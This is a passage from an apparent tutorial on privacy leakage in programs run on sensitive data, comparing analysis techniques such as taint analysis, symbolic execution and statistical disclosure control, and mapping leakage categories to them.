A technique that answers the first question may not be sufficient to answer the second or third.

## 5.1 Technique Comparison

The following table summarizes the main approaches.

| Technique | Main Strength | Main Limitation |
|---|---|---|
| Rule-based inspection | Fast detection of known patterns | Misses indirect or unfamiliar behavior |
| Static data-flow / taint analysis | Tracks sensitive information through code | May be imprecise; limited for statistical privacy |
| Control-flow analysis | Reasons about execution paths | Difficult with complex runtime conditions |
| Symbolic execution | Explores input-dependent paths | Path explosion and modeling complexity |
| Dynamic analysis | Observes actual execution | Limited to executed paths |
| Property-based testing | Explores many generated test cases | Cannot generally guarantee complete coverage |
| Statistical disclosure control | Evaluates dataset-dependent risks | Requires data characteristics and policy rules |
| Formal verification | Provides rigorous guarantees under assumptions | Requires formal models and specifications |
| Query composition analysis | Detects combined disclosure risks | Requires release history and contextual information |
| ML privacy evaluation | Examines privacy risks of trained models | Empirical tests do not prove complete safety |
| LLM-based analysis | Flexible reasoning about code and policies | Potentially inconsistent and not formally guaranteed |
| Hybrid analysis | Combines complementary methods | Higher complexity and integration cost |

---

## 5.2 Mapping Leakage Categories to Analysis Techniques

The following table identifies techniques that can be particularly relevant for the leakage categories introduced in this tutorial.

The mappings are indicative rather than exhaustive.

| Category | Leakage Property | Relevant Techniques |
|---|---|---|
| A | Direct disclosure | Rule-based inspection, taint analysis |
| B | Access without disclosure | Data-flow analysis, policy checking |
| C | Variable propagation | Data-flow analysis, taint analysis |
| D | Transformation | Taint analysis, dynamic analysis, output inspection |
| E | Cross-function leakage | Interprocedural analysis, taint analysis |
| F | Conditional leakage | Control-flow analysis, symbolic execution, testing |
| G | Unreachable code | Reachability analysis, symbolic execution |
| H | Aggregation | Statistical disclosure control, testing |
| I | Small-group leakage | Statistical disclosure control, property-based testing |
| J | Quasi-identifiers | Uniqueness analysis, re-identification risk assessment |
| K | Implicit information flow | Control-dependency analysis, symbolic execution, formal methods |
| L | Logging | Rule-based inspection, taint analysis, runtime monitoring |
| M | Files | Static analysis, taint analysis, runtime monitoring |
| N | Network | Static analysis, taint analysis, runtime monitoring |
| O | Errors | Data-flow analysis, exception analysis, testing |
| P | Multiple queries | Query-history analysis, statistical disclosure analysis |
| Q | Returned models or objects | Object inspection, taint analysis, ML privacy evaluation |

LLM-based analysis can support code-level reasoning across many categories, but it is not a substitute for techniques that establish particular properties through execution, mathematical verification, or examination of actual data.

---

# 6. From Simple Leakage to Information-Flow Analysis

The categories above form a progression.

The simplest case is:

```text
Sensitive Data
      |
      v
    Output
```

More complicated programs introduce intermediate operations:

```text
Sensitive Data
      |
      v
   Variable
      |
      v
Transformation
      |
      v
   Function
      |
      v
    Output
```

Still more complicated cases introduce control dependencies:

```text
Sensitive Data
      |
      v
  Condition
    /   \
   v     v
 Path A Path B
    \   /
     v v
    Output
```

And some privacy risks depend on information outside the program itself:

```text
Program
   +
Dataset Properties
   +
Previous Outputs
   +
External Knowledge
   |
   v
Privacy Risk
```

This distinction is important because not every privacy question can be answered by inspecting Python syntax alone.

The problem becomes more challenging as we move from identifying direct source-to-sink flows toward evaluating the actual information revealed to an observer.

A useful conceptual separation is:

```text
                Program Analysis
                       |
                       v
          What information can flow?
                       |
                       v
             Disclosure Analysis
                       |
                       v
         What information is revealed?
                       |
                       v
               Policy Evaluation
                       |
                       v
            Is the release permitted?
```

These stages need not correspond to separate software components.

However, distinguishing them helps clarify what evidence is required for a reliable privacy assessment.

---

# 7. Summary

Protecting a dataset does not automatically prevent information disclosure.

When programs are allowed to execute on sensitive data, the programs themselves become part of the security and privacy boundary.

Different kinds of leakage require different forms of reasoning:

| Category | Main Concept |
|---|---|
| Direct disclosure | Sensitive sources and outputs |
| Access without disclosure | Access vs. information flow |
| Variable propagation | Data-flow analysis |
| Transformation | Derived information |
| Functions | Interprocedural analysis |
| Conditional leakage | Control-flow analysis |
| Unreachable code | Reachability |
| Aggregation | Statistical disclosure |
| Small groups | Group-size protection |
| Quasi-identifiers | Re-identification |
| Implicit flow | Control dependencies |
| Logging | Alternative sinks |
| Files | Persistent output channels |
| Network | External communication |
| Errors | Exception-based disclosure |
| Multiple queries | Composition |
| Models | Complex derived outputs |

The central question behind many of these categories is:

> Can protected information influence something observable outside the permitted boundary?

However, answering this question does not always establish whether a privacy violation has occurred.

An output may depend on sensitive information while still being permitted under a well-defined privacy policy.

Consequently, privacy analysis involves both understanding information flow and determining whether the resulting disclosure is acceptable.

Different techniques contribute different capabilities:

- Static analysis examines possible program behavior before execution.
- Data-flow and taint analysis track dependencies between sensitive sources and outputs.
- Control-flow analysis and symbolic execution reason about possible execution paths.
- Dynamic analysis and testing observe behavior for concrete inputs.
- Statistical disclosure control evaluates risks arising from actual data and reported results.
- Formal methods provide rigorous reasoning under defined assumptions.
- Query-history analysis examines risks arising from combinations of outputs.
- Machine-learning privacy evaluation investigates disclosures from trained models.
- LLM-based analysis provides flexible semantic reasoning about code and privacy requirements.
- Hybrid analysis combines complementary techniques.

The harder cases demonstrate an equally important lesson:

> Some privacy properties depend not only on the program, but also on the dataset, execution environment, previous queries, external information, and privacy policy.

No single technique provides a complete solution for all these cases.

Understanding the strengths, limitations, and appropriate applications of different analysis techniques is therefore essential when designing systems that evaluate programs before allowing them to execute on sensitive data.